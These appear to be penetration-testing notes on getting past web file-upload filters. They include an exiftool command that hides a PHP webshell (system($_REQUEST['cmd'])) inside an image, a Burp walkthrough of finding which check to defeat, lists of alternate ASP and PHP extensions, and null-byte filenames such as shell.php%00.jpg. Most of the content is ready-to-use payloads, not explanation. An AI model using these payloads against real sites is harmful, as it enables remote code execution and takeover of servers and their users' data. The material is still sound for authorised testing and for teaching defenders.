## Basics

- replace .php by php3
- Replace the Content-Type by : Content-Type: image/png
- take a png, add php code inside, rename it as image.php
- add a null byte : cmd.php%00.jpg

## Inject malicious php into a picture

- another one : https://sushant747.gitbooks.io/total-oscp-guide/bypass_image_upload.html

- ```exiftool -Comment='<?php system($_REQUEST['cmd']); ?>' pic.jpg```
- ```mv pic.jpg pic.php.jpg```

## Example : Bypass security filter to upload php instead of other stuff

- If I submit a simple php webshell instead of a picture, it returns “Invalid file”. There is some filtering going on that I’ll need to bypass.

- I’ll find the allowed upload of a PNG in Burp and send it to Repeater. There are three common ways that a website will check for valid file types by comparing them to an allow- or deny-list:

1. File extension
2. Content-Type header
3. Magic bytes

- I’ll start by changing one at a time to see if the site blocks. First, I’ll change the extension to .php. It works.

- If I change the Content-Type header to application/x-php, it blocks it (even with the file name changed back to .png).

- Changing the content doesn’t seem to matter.

- Based on the filter testing, it seems like I can name a file .php and include PHP code, as long as I change the Content-Type header to a valid image.

## Bypass by changing extension :

- ASP:

.aspx
.config
.ashx
.asmx
.aspq
.axd
.cshtm
.cshtml
.rem
.soap
.vbhtm
.vbhtml
.asa
.asp
.cer
.shtml

- PHP:

.php
.php5
.php3
.php2
.shtml
.html
.php.png
(double extension attack)
What we would typically want to achieve is to circumvent the controls restricting the type of content that can be uploaded onto the website and try to upload something interesting like:

ASP / PHP file with a webshell – RCE
HTML file with Javascript code – XSS
EICAR file – test possibility of hosting malware
Protip: Don’t forget to always try the NULL byte injection trick as well, e.g.:

file.jpg%00shell.php
shell.php%00file.jpg
shell.php%00.jpg
